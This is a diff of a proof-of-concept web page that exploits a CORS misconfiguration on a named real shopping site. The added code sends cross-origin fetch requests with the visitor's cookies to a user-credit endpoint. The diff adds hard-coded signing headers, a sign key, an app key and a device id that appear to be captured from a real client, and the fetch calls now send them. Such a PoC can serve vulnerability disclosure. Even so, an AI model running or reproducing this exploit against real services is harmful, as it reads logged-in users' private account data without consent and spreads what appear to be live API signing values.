@@ -120,12 +120,23 @@ This PoC demonstrates a CORS misconfiguration allowing authenticated requests to
 
 <script>
 
+const customHeaders = {
+"Content-Type":"application/json;charset=UTF-8",
+"x-web-client-type":"mobile",
+"x-sign":"3HVUaCnfKgkv96/vKFDQ1uj2KC8=",
+"x-requesttime":"1772758692830",
+"x-sign-key":"4iAEb620alQ8s8c8ss8o0K8sS",
+"x-biz-appkey":"TZeSXfQXxrCyjhvARaVrmw",
+"x-app-deviceid":"52c4b8449f2f5509808568b8d7f917e9",
+"disableenvelope":"true"
+};
+
 function createCard(title,label,url){
 
 let card=document.createElement("div")
 card.className="card"
 
-card.innerHTML=
+card.innerHTML =
 '<div class="label '+label+'">'+title+'</div>'+
 '<div class="url">'+url+'</div>'+
 '<div class="status" id="'+label+'_status">Waiting for request...</div>'+
@@ -159,12 +170,12 @@ createCard(
 "https://www.opposhop.cn/cn/oapi/users/web/credits/getUserCredit"
 )
 
-
 function request(url,label){
 
 fetch(url,{
 method:"GET",
-credentials:"include"
+credentials:"include",
+headers: customHeaders
 })
 
 .then(r=>{
